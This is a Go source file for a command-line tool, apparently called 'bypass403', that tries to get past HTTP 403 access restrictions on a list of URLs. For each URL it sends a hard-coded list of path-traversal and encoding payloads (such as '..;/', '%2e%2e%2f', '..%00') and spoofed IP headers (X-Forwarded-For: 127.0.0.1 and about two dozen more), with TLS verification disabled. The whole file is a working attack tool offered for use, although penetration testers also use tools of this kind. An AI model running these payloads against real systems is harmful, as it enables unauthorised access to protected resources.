package main

import (
	"bufio"
	"crypto/tls"
	"errors"
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/enenumxela/urlx/pkg/urlx"
	"github.com/logrusorgru/aurora/v3"
)

type options struct {
	concurrency int
	delay       int
	noColor     bool
	URLs        string
}

var (
	o  options
	au aurora.Aurora
)

func banner() {
	fmt.Fprintln(os.Stderr, aurora.BrightBlue(`
     _       _                               _  _             
 ___(_) __ _| |__  _   _ _ __   __ _ ___ ___| || |__  ____  __
/ __| |/ _`+"`"+` | '_ \| | | | '_ \ / _`+"`"+` / __/ __| || |\ \/ /\ \/ /
\__ \ | (_| | |_) | |_| | |_) | (_| \__ \__ \__   _>  <  >  < 
|___/_|\__, |_.__/ \__, | .__/ \__,_|___/___/  |_|/_/\_\/_/\_\ v1.0.0
       |___/       |___/|_| 
`).Bold())
}

func init() {
	flag.IntVar(&o.concurrency, "c", 20, "")
	flag.IntVar(&o.delay, "delay", 100, "")
	flag.BoolVar(&o.noColor, "nC", false, "")
	flag.StringVar(&o.URLs, "iL", "", "")

	flag.Usage = func() {
		banner()

		h := "USAGE:\n"
		h += "  bypass403 [OPTIONS]\n"

		h += "\nOPTIONS:\n"
		h += "  -c         concurrency level (default: 20)\n"
		h += "  -delay     delay between requests (default: 100ms)\n"
		h += "  -iL        urls with 403 to bypass (use `iL -` to read from stdin)\n"
		h += "  -nC        no color mode\n\n"

		fmt.Fprint(os.Stderr, h)
	}

	flag.Parse()

	au = aurora.NewAurora(!o.noColor)
}

func main() {
	if o.URLs == "" {
		os.Exit(1)
	}

	URLs := make(chan string, o.concurrency)

	go func() {
		defer close(URLs)

		var scanner *bufio.Scanner

		if o.URLs == "-" {
			stat, err := os.Stdin.Stat()
			if err != nil {
				log.Fatalln(errors.New("no stdin"))
			}

			if stat.Mode()&os.ModeNamedPipe == 0 {
				log.Fatalln(errors.New("no stdin"))
			}

			scanner = bufio.NewScanner(os.Stdin)
		} else {
			openedFile, err := os.Open(o.URLs)
			if err != nil {
				log.Fatalln(err)
			}

			defer openedFile.Close()

			scanner = bufio.NewScanner(openedFile)
		}

		for scanner.Scan() {
			URLs <- scanner.Text()
		}

		if scanner.Err() != nil {
			log.Fatalln(scanner.Err())
		}
	}()

	wg := &sync.WaitGroup{}

	for i := 0; i < o.concurrency; i++ {
		wg.Add(1)

		go func() {
			defer wg.Done()

			client, err := getClient()
			if err != nil {
				log.Fatalln(err)
			}

			for URL := range URLs {
				if URL == "" {
					continue
				}

				// Trim the trailing slash
				URL = strings.TrimRight(URL, "/")

				// Trim the spaces on either end (if any)
				URL = strings.Trim(URL, " ")

				parsedURL, err := urlx.Parse(URL)
				if err != nil {
					log.Fatalln(err)
				}

				bypasses := []string{}

				payloads := []string{"?", "??", "???", "&", "#", "%", "%20", "%20/", "%09", "/", "//", "/.", "/~", ";/", "/..;/", "../", "..%2f", "..;/", "../", "\\..\\.\\", ".././", "..%00", "..%0d/", "..5c", "..\\", "..%ff/", "%2e%2e%2f", ".%2e/", "%3f", "%26", "%23", ".json"}

				for _, payload := range payloads {
					bypasses = append(bypasses, fmt.Sprintf("%s%s", parsedURL.String(), payload))
				}

				headers := [][]string{
					{"Forwarded", "127.0.0.1"},
					{"Forwarded", "localhost"},
					{"Forwarded-For", "127.0.0.1"},
					{"Forwarded-For", "localhost"},
					{"Forwarded-For-Ip", "127.0.0.1"},
					{"X-Client-IP", "127.0.0.1"},
					{"X-Custom-IP-Authorization", "127.0.0.1"},
					{"X-Forward", "127.0.0.1"},
					{"X-Forward", "localhost"},
					{"X-Forwarded", "127.0.0.1"},
					{"X-Forwarded", "localhost"},
					{"X-Forwarded-By", "127.0.0.1"},
					{"X-Forwarded-By", "localhost"},
					{"X-Forwarded-For", "127.0.0.1"},
					{"X-Forwarded-For", "localhost"},
					{"X-Forwarded-For-Original", "127.0.0.1"},
					{"X-Forwarded-For-Original", "localhost"},
					{"X-Forwared-Host", "127.0.0.1"},
					{"X-Forwared-Host", "localhost"},
					{"X-Host", "127.0.0.1"},
					{"X-Host", "localhost"},
					{"X-Originating-IP", "127.0.0.1"},
					{"X-Remote-IP", "127.0.0.1"},
					{"X-Remote-Addr", "127.0.0.1"},
					{"X-Remote-Addr", "localhost"},
					{"X-Forwarded-Server", "127.0.0.1"},
					{"X-Forwarded-Server", "localhost"},
					{"X-HTTP-Host-Override", "127.0.0.1"},
				}

				if parsedURL.Path != "" && parsedURL.Path != "/" {
					bypasses = append(bypasses, parsedURL.Scheme+"://"+parsedURL.Domain+"/%2e"+parsedURL.Path)
					bypasses = append(bypasses, fmt.Sprintf("%s://%s/%s//", parsedURL.Scheme, parsedURL.Domain, parsedURL.Path))
					bypasses = append(bypasses, fmt.Sprintf("%s://%s/.%s/./", parsedURL.Scheme, parsedURL.Domain, parsedURL.Path))
				}

				for _, bypass := range bypasses {
					time.Sleep(time.Duration(o.delay) * time.Millisecond)

					res, err := Request(bypass, map[string]string{}, client)
					if err != nil {
						continue
					}

					fmt.Println("[", coloredStatus(res.StatusCode, au), "]", bypass)
				}

				for j := 0; j < len(headers); j++ {
					time.Sleep(time.Duration(o.delay) * time.Millisecond)

					res, err := Request(parsedURL.String(), map[string]string{headers[j][0]: headers[j][1]}, client)
					if err != nil {
						continue
					}

					fmt.Println("[", coloredStatus(res.StatusCode, au), "]", parsedURL.String(), "-H", headers[j][0]+":", headers[j][1])
				}
			}
		}()
	}

	wg.Wait()
}

func getClient() (*http.Client, error) {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   30 * time.Second,
			KeepAlive: time.Second,
			DualStack: true,
		}).DialContext,
	}

	return &http.Client{
		Transport: transport,
	}, nil
}

func Request(URL string, headers map[string]string, client *http.Client) (*http.Response, error) {
	var res *http.Response

	req, err := http.NewRequest(http.MethodGet, URL, nil)
	if err != nil {
		return res, err
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}

	res, err = client.Do(req)
	if err != nil {
		return res, err
	}

	return res, nil
}

func coloredStatus(code int, au aurora.Aurora) aurora.Value {
	var coloredStatusCode aurora.Value

	switch {
	case code >= http.StatusOK && code < http.StatusMultipleChoices:
		coloredStatusCode = au.BrightGreen(strconv.Itoa(code)).Bold()
	case code >= http.StatusMultipleChoices && code < http.StatusBadRequest:
		coloredStatusCode = au.BrightYellow(strconv.Itoa(code)).Bold()
	case code >= http.StatusBadRequest && code < http.StatusInternalServerError:
		coloredStatusCode = au.BrightRed(strconv.Itoa(code)).Bold()
	case code > http.StatusInternalServerError:
		coloredStatusCode = au.Bold(aurora.Yellow(strconv.Itoa(code)))
	}

	return coloredStatusCode
}
